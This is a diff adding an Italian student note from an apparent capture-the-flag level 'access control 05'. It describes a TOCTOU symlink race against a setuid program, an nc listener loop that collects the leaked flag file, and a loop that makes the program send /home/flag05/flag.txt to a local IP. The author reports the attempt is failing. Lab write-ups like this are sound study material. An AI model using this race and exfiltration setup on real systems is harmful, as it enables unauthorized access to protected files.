@@ -1,0 +1,24 @@
+access control 05 -> ho notato che il programma restituisce il contenuto di un file se sono autorizzato ad accedere, e me lo invia all'host specificato, 
+		alla porta 18211, quindi ho:
+		
+		1. creato un server sempre in ascolto nella porta 18211, che stampa ogni cosa ricevuta nel file access_control_05.txt, con il comando:
+			while true; do nc -l -v -p 18211 >> ./access_control_05.txt; done
+	
+
+		2. aperto tail per leggere gli append al file, con il comando:
+			tail -f ./access_control_05.txt
+		
+		3. una volta fatto l'accesso alla VM ho impostato un continuo cambio di collegamento con i comandi:
+			touch /tmp/fake.txt
+			
+			while true; ln -s -f /home/flag05/flag.txt /tmp/link; ln -s -f /tmp/fake.txt /tmp/link; done 
+		
+		in modo da "ingannare" il controllo per poi passargli il file di cui volevo mi fosse dato il contenuto.
+
+		4. ho inviato in loop il comando per eseguire flag05 in modo da avere più probabilità di cadere nella situazione in cui il controllo è 
+		effettuato su fake.txt mentre la stampa su flag.txt, con il comando:
+			while true; do /home/flag05/flag05 /tmp/link 192.168.1.9; done
+
+		ma non va, quello che noto è che a volte mi stampa il carattere di controllo ".o0 0o.", mentre altre volte nemmeno quello e si blocca in 
+		attesa di una connessionei che però si blocca, nel senso che non riesce nè a stabilire la connessione nè a rifiutarla per provare un nuovo
+		tentativo. 
